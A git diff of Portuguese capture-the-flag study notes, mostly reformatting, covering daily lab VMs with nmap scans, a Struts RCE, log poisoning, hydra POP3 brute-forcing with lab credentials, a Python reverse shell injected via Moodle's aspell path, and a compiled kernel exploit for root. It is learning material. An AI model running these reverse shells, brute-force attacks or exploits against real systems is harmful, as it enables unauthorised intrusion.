@@ -16,7 +16,7 @@ Desafio 13 -
 <br/>#**--VM--**
 	
 	
-**Dia 1 - desafio 2(1° desafio)     7/9/2020**
+<h3>**Dia 1 - desafio 2(1° desafio)     7/9/2020**</h3>
 
        *scan com nmap        
         *identificação do wordpress -> wpscan -> pesquisar por exploit dos plugins -> wp_google
@@ -35,7 +35,7 @@ Desafio 13 -
 
 
 
-__#Dia 2 - desafio 2(° 2desafio)			8/9/2020__
+<h3>__#Dia 2 - desafio 2(° 2desafio)			8/9/2020__</h3>
 	
 	*Pesquisa sobre “trust” -> vulnerabilidade conhecida -> exploit encontrado: Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution
 	
@@ -46,7 +46,7 @@ __#Dia 2 - desafio 2(° 2desafio)			8/9/2020__
 
 
 
-__#Dia 3 			9/9/2020__
+<h3>__#Dia 3 			9/9/2020__</h3>
 	
 	*Varredura do alvo
 		indetificação vulnerabilidade 
@@ -70,7 +70,7 @@ __#Dia 3 			9/9/2020__
 			
 			
 			
-__#Dia 4 			10/9/2020__
+<h3>__#Dia 4 			10/9/2020__</h3>
 
 	*Varredra da máquina
 	
@@ -111,7 +111,7 @@ __#Dia 4 			10/9/2020__
 
 
 
-__#Dia 5 			11/9/2020__
+<h3>__#Dia 5 			11/9/2020__</h3>
 
 	*Scan básico
 		-sV -Pn  ip_alvo
@@ -150,7 +150,7 @@ __#Dia 5 			11/9/2020__
 				
 
 
-__#Dia 6 			12/9/2020__
+<h3>__#Dia 6 			12/9/2020__</h3>
 
 	*scan
 	
@@ -166,7 +166,7 @@ __#Dia 6 			12/9/2020__
 		
 	*ssh
 
-__#Dia 7 			13/9/2020__
+<h3>__#Dia 7 			13/9/2020__</h3>
 
 	*scan alvo
 	
@@ -201,7 +201,7 @@ __#Dia 7 			13/9/2020__
 			root pois está no mesmo grupo
 			
 
-__#Dia 8 			14/9/2020__
+<h3>__#Dia 8 			14/9/2020__</h3>
 
 	*scan padrão
 	
@@ -224,7 +224,7 @@ __#Dia 8 			14/9/2020__
 				.
 				w /etc/passwd
 
-__#Dia 9 			15/9/2020__
+<h3>__#Dia 9 			15/9/2020__</h3>
 	
 	*scan
 	
@@ -247,10 +247,10 @@ __#Dia 9 			15/9/2020__
 					/usr/bin/find -exec  "/bin/bash" \;
 
 
-__#Dia 10			16/9/2020__
+<h3>__#Dia 10			16/9/2020__</h3>
 
-*burp suite
-	repeater	-> index.php?file=about.php
+	*burp suite
+	repeater -> index.php?file=about.php
 	/var/log/auth.log
 		#ssh root@192.168.0.x vai aparecer no log
 		#usaremos no lugar do usuario algum script php para ser executado no saida do log
@@ -280,7 +280,7 @@ __#Dia 10			16/9/2020__
 		
 		
 
-__#Dia 11 			17/9/2020__
+<h3>__#Dia 11 			17/9/2020__</h3>
 
 	*scan padrão
 		porta 80
@@ -290,107 +290,107 @@ __#Dia 11 			17/9/2020__
 						InvincibleHack3r
 		
 	*scan -p-
-		pop3 55007
+	pop3 55007
+		nc 192.168.0.x 55007
+			USER boris
+			PASS InvincibleHack3r
+				senha errada, user existe
+
+	*hydra -l (user) -P (senhas-wordlist) 192.168.0.x (-s (porta) sem o -s ele roda na porta padrão) pop3 (protocolo)
+		password: secret1!
 			nc 192.168.0.x 55007
-				USER boris
-				PASS InvincibleHack3r
-					senha errada, user existe
-					
-		*hydra -l (user) -P (senhas-wordlist) 192.168.0.x (-s (porta) sem o -s ele roda na porta padrão) pop3 (protocolo)
-			password: secret1!
-				nc 192.168.0.x 55007
-				user boris
-				pass secret1!
-					
-						pop3
-							list -> lista emails
-							retr x -> ler email	-> retr 2 -> natalya
-							
-				hydra -l  natalya -P (senhas-wordlist) 192.168.0.x -s 55007 pop3 
-					pass: bird
-					
-				nc 192.168.0.x 55007
-				user natalya
-				pass bird
-					
-				retr 2 
-					user: xenia
-					pass: RCP90rulez!
-					
-					adcionar ao /etc/host 
-						192.168.100.14	severnaya-station.com 
-							http://severnaya-station.com/gnocertdir/
-								user: xenia
-								pass: RCP90rulez!
+			user boris
+			pass secret1!
+
+					pop3
+						list -> lista emails
+						retr x -> ler email	-> retr 2 -> natalya
+
+			hydra -l  natalya -P (senhas-wordlist) 192.168.0.x -s 55007 pop3 
+				pass: bird
+
+			nc 192.168.0.x 55007
+			user natalya
+			pass bird
+
+			retr 2 
+				user: xenia
+				pass: RCP90rulez!
+
+				adcionar ao /etc/host 
+					192.168.100.14	severnaya-station.com 
+						http://severnaya-station.com/gnocertdir/
+							user: xenia
+							pass: RCP90rulez!
 								
-					my profile -> messages -> Dr Doak
-						 hydra -l  doak -P /usr/share/wordlist/fasttrack.txt 192.168.0.x -s 55007 pop3
-						pass: goat
-							nc 192.168.0.x 55007
-							user doak
-							pass goat
-								list
-								retr x
-												
-								user: dr_doak
-								pass: 4England!
-											
-							logout moodle
-							novo login
-								user: dr_doak
-								pass: 4England!
-									my profile -> my private files -> s3cret.txt
-											
-							http://severnaya-station.com/dir007key/for-007.jpg
-							salvar imagem
-					*strings imagem/exiftool imagem
-						
-					echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d 
-					
-						moodle
-						user: admin
-						pass: xWinter1995x!
-						
-							site administrator -> plugin ->text editor -> tynyMCE html editor 
-								Spell engine = PSpellShell
+				my profile -> messages -> Dr Doak
+					 hydra -l  doak -P /usr/share/wordlist/fasttrack.txt 192.168.0.x -s 55007 pop3
+					pass: goat
+						nc 192.168.0.x 55007
+						user doak
+						pass goat
+							list
+							retr x
+
+							user: dr_doak
+							pass: 4England!
+
+						logout moodle
+						novo login
+							user: dr_doak
+							pass: 4England!
+								my profile -> my private files -> s3cret.txt
+
+						http://severnaya-station.com/dir007key/for-007.jpg
+						salvar imagem
+				*strings imagem/exiftool imagem
+
+				echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d 
+
+					moodle
+					user: admin
+					pass: xWinter1995x!
+
+						site administrator -> plugin ->text editor -> tynyMCE html editor 
+							Spell engine = PSpellShell
 								
-							site administrator -> server -> system paths
-								path to aspell ->  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 				os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-								
-				editar ip e porta
+						site administrator -> server -> system paths
+							path to aspell ->  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 				os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-				nc -lnvp 443
+			editar ip e porta
 
-				*moodle
-				Home -> My profile -> Blogs -> Add a new entry
-					escrever qualquer coisakasdasfosjdjoas
-					clicar em Toggle spellchecker -> opção inferior dirito do menu de opções “ABC” para chamar o spell
+			nc -lnvp 443
 
-			uname -a
+			*moodle
+			Home -> My profile -> Blogs -> Add a new entry
+				escrever qualquer coisakasdasfosjdjoas
+				clicar em Toggle spellchecker -> opção inferior dirito do menu de opções “ABC” para chamar o spell
+
+		uname -a
+
+	kali-> searchsploit linux 3.13
+		/usr/share/exploitdb/exploits/linux/local/37292.c
+
+		compilar o arquivo -> gcc -o data 37292.c (compilou 37292.c pra data)
+
+			transferir para a maquina alvo
+				python -m SimpleHTTPServer 8080
+				m_alvo -> wget ip_kali:8080/37292.c
+
+				chmod +x data -> pra execução
+				./data  -> vai dar erro pois n tem o gcc  pra compilar, porém em /usr/bin existe o cc que também serve pra compilar
+
+		editar o 37292.c pois esta referenciando a lib do gcc
+			vim datanovo -> linha 143 , tirar o gcc e por cc											
+
+			mandar pro alvo
+				compilar -> cc -o datanovo 37292.c
+					executar -> ./datanovo
+					root :)
 						
-		kali-> searchsploit linux 3.13
-			/usr/share/exploitdb/exploits/linux/local/37292.c
-
-			compilar o arquivo -> gcc -o data 37292.c (compilou 37292.c pra data)
-
-				transferir para a maquina alvo
-					python -m SimpleHTTPServer 8080
-					m_alvo -> wget ip_kali:8080/37292.c
-
-					chmod +x data -> pra execução
-					./data  -> vai dar erro pois n tem o gcc  pra compilar, porém em /usr/bin existe o cc que também serve pra compilar
-																			
-			editar o 37292.c pois esta referenciando a lib do gcc
-				vim datanovo -> linha 143 , tirar o gcc e por cc											
-
-				mandar pro alvo
-					compilar -> cc -o datanovo 37292.c
-						executar -> ./datanovo
-						root :)
-						
 
 
-__Dia 12 			18/9/2020__
+<h3>__Dia 12 			18/9/2020__</h3>
 
 	*scan default
 	
